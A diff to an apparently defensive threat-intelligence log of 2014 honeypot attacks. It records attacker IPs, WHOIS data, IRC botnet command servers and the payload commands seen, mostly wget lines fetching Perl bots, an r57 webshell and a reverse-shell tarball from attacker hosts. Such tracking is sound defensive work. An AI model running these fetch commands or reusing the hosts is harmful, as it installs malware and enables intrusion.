@@ -223,11 +223,14 @@ Payload: wget api.alihack.com/info.txt
 Description: very small payload, posts to alihack.com. It's recon to ascertain PHP RFI vulnerability.
 Notes: 
 -121.205.200.35
+-121.204.188.32
 -68.64.172.226
 -59.58.159.25
 -142.54.184.243
 -121.205.200.35
 -23.95.34.227 
+-195.211.155.160
+-199.48.161.79
 - The IP addresses listed above are also throwing this same payload, this payload seems to be targeted towards the energy sector.
 
 Pitcher: 188.190.98.18
@@ -592,7 +595,7 @@ WHOIS (catcher):
 PEAKINTERNET
 US
 noc@peakinter.net
-Payload: wget 208.85.177.238/speedtest/.a/hb/php08
+Payload: wget 208.85.177.238/speedtest/.a/hb/php08, wget 208.85.177.238/.x/hb/php01, wget 208.85.177.238/.x/hb/php07, wget 208.85.177.238/.x/hb/phk00
 Description: Perlbot
 Server: 194.24.228.203
 Port: 443
@@ -607,4 +610,252 @@ AS41044
 Notes:
 - Does the Catcher IRC Server look familiar? I thought it would. Peak still has yet to fix their server actively serving payloads. 
 - Also saw 80.73.9.164 Referring to 208.85.177.238/speedtest/.a/hb/php07 (same payload)
+- 187.63.160.3 was seen referring to .x/hb/phk00
+
+#9/23/14
+
+Pitcher: 89.248.160.192
+Catcher: dl.directxex.net
+NSlookup (pitcher): server162416.santrex.net
+WHOIS (pitcher):
+Ecatel LTD
+NL
+abuse@ecatel.net
+89.248.160.0/21
+AS29073
+NSlookup (catcher): 188.165.74.152
+WHOIS (catcher):
+188.165.0.0/16
+OVH Paris France
+FR
+abuse@ovh.net
+AS16276
+Payload: wget http://dl.directxex.net/dl/nice.png
+Description: perlbot
+Server: 94.102.52.10
+Port: 6667
+Channel: #perl
+NSlookup: hosted-by.ecatel.net
+WHOIS:
+Ecatel LTD
+NL
+abuse@ecatel.net
+AS29073
+94.102.48.0/20
+Notes:
+- Saw the same botnet CnC server a few weeks back. Same payload, new pitcher and catcher.
+
+Pitcher: 213.5.67.223
+Catcher: 213.5.67.223
+Nslookup (pitcher): hosted-by.as51430.net.
+WHOIS (pitcher):
+213.5.64.0/21
+AltusHost B.V.
+NL
+abuse@as51430.net
+AS29073
+NSlookup (catcher):
+WHOIS (catcher):
+Payload: wget http://213.5.67.223/jurs, wget http://213.5.67.223/jur1
+Description:
+Server: 185.31.209.84
+Port: 443
+Channel: #114
+NSlookup: zaikov.srv6.sim-networks.net.
+WHOIS:
+185.31.209.0/24
+SIM-Networks Professional Hosting Solutions
+DE
+abuse@sim-networks.com
+AS20546
+Notes:
+-We've seen this server acting as a catcher previously, now it seems to be acting as pitcher/catcher. Also a new botnet CNC
+-Both payloads are exactly the same (same sha1sum)
+
+Pitcher: 134.97.4.221
+Catcher: braceland.nl
+NSlookup (pitcher): host4-1.irrsinn.de.
+WHOIS (pitcher):
+134.97.4.0/24
+irrsinn.de GmbH
+DE
+AS20773
+NSlookup (catcher): 85.214.89.206
+WHOIS (catcher):
+85.214.150.0/24
+Strato AG
+DE
+abuse@strato.de
+AS6724
+Payload: wget http://braceland.nl/plm
+Description: perlbot
+Server: 80.240.137.183
+Port: 3303
+Channel: #work
+NSlookup: server.oakleyharrod.com
+WHOIS: 
+80.240.128.0 - 80.240.143.255
+Digital Ocean, Inc.
+NL
+abuse@digitalocean.com
+Notes:
+-not the first time seeing this payload or CNC server.
+-first time seeing this pitcher/catcher combo, though.
+
+Pitcher: 187.33.2.88
+Catcher: 213.187.93.53
+Nslookup (pitcher): wp1053.cloudtecla.com.br
+WHOIS (pitcher):
+187.33.0.0/19
+ALOG SOLUCOES DE TECNOLOGIA EM INFORMATICA S.A.
+BR
+abuse@alog.com.br
+AS26592
+NSlookup (catcher): v213-187-93-53.leits.com
+WHOIS (catcher):
+213.187.64.0/19
+LOSWEBOS-L-01
+DE
+AS16097
+Payload: wget http://213.187.93.53/ipc/.../x.tgz (see notes for details)
+Description: Multi-Part IRC bot/backdoor
+Server: N/A (Will require dynamic analysis)
+Port: N/A (Will require dynamic analysis)
+Channel: N/A (Will require dynamic analysis)
+NSlookup: N/A
+WHOIS: N/A
+Notes:
+- I've seen this payload in the past, even mentioned it on my twitter timeline IIRC
+- x.tgz contains three binaries: .klogd, rrs and syslogd
+- all binaries are UPX packed.
+- .klogd: Binary IRC backdoor. At this point and time, it is unknown who or what it connects to 
+- string analysis has references to stun.xten.com, and also has several strings referring to STUN protocol.
+- string analysis also refers to syslogd and rrs, so likely this is the primary means of target interaction.
+- string analysis shows several references to php directories; likely uses php RFI as primarily means of spreading.
+- rrs: (reverse remote shell) is well-known reverse shell/backdoor. Supports strong encryption as well. http://freecode.com/projects/rrs
+- syslogd: pnscan, a simple but fast port scanner.
+
+Pitcher: 69.163.241.178
+Catcher: www.lessons.cl
+Nslookup (pitcher): hathor.dreamhost.com
+WHOIS (pitcher):
+69.163.128.0/17
+new dream network, llc
+US
+netops@hq.dreamhost.com, abuse@dreamhost.com
+AS26347
+NSlookup (catcher): 69.163.241.214
+WHOIS (catcher):  
+69.163.128.0/17
+new dream network, llc
+US
+netops@hq.dreamhost.com, abuse@dreamhost.com
+AS26347
+Payload: http://www.lessens.cl/lol/r.txt
+Description: R57 PHP-based Webshell
+Notes:
+-Seen this payload before. Looks like the actors are shifting Pitchers and catchers. Still has a fixation on targeting the energy industry.
+-r57 is a php webshell in the same family as B374k and c99.
+
+
+Pitcher: 81.19.181.134
+Catcher: 107.167.11.226
+Nslookup (pitcher): NX
+WHOIS (pitcher): 
+81.19.176.0/20
+Blackfoot hosting ltd
+GB
+abuse@uknoc.co.uk
+AS34282
+NSlookup (catcher): customer.sharktech.net
+WHOIS (catcher):
+107.167.11.224/29
+putaoshuju/LICHEN-SUN
+CN
+9887816@qq.com, timt@sharktech.net
+Payload: wget http://107.167.11.226/pds1
+Description: perlbot
+Server: 50.56.238.185
+Port: 80
+Channel: #114
+NSlookup: 50-56-238-185.static.cloud-ips.com.
+WHOIS:
+50.56.236.0 - 50.56.239.255
+Rackspace Cloud Hosting
+Notes:
+-Seen this payload before, but with different pitcher/catcher combo
+
+Pitcher: 185.27.36.67
+Catcher: 208.85.177.238
+Nslookup (pitcher): r500.opex-network.is.
+WHOIS (pitcher):
+185.27.36.0/22
+Opex ehf - IPv4 Network
+IS
+AS60690
+NSlookup (catcher): 208-85-177-238.peakinter.net
+WHOIS (catcher):
+208.85.176.0/21
+PEAKINTERNET
+US
+Payload: wget 208.85.177.238/.x/hb/plk00
+Description: Perlbot
+Server: 194.24.228.203
+Port: 443
+Channel: #allornothing
+NSlookup: 194-24-228-203.thya.net.
+WHOIS:
+194.24.228.0/23
+L'ile aux surfers s.a.r.l.
+FR
+abuse@ripe.net
+AS41044
+Notes:
+-Seen this payload before, but from a new Pitcher.
+
+Pitcher: 192.3.140.202
+Catcher: 46.36.35.162
+Nslookup (pitcher): NX
+WHOIS (pitcher):
+192.3.0.0/16
+ColoCrossing
+US
+support@colocrossing.com, abuse@colocrossing.com
+AS36352
+NSlookup (catcher): . (NX)
+WHOIS (catcher):
+46.36.32.0/19
+GTT a.s. Hornatecka 1772/19 180 00 Praha 8 Czech Republic
+CZ
+AS51731
+Payload: http://46.36.35.162/bot.pl (see notes)
+Description: perlbot, reverse shell
+Server: 46.36.35.162
+Port: 6667
+Channel: #hard
+NSlookup: . (NX)
+WHOIS:
+46.36.32.0/19
+GTT a.s. Hornatecka 1772/19 180 00 Praha 8 Czech Republic
+CZ
+AS51731
+Notes:
+-Not really subtle. "bot.pl"
+-Also sends back a reverse shell to 192.13.140.202 on port 3133
+
+#Template. CHOOSE YOUR OWN ADVENTURE!
+Pitcher:
+Catcher:
+Nslookup (pitcher):
+WHOIS (pitcher):
+NSlookup (catcher):
+WHOIS (catcher):
+Payload:
+Description:
+Server:
+Port:
+Channel:
+NSlookup:
+WHOIS:
+Notes:
 
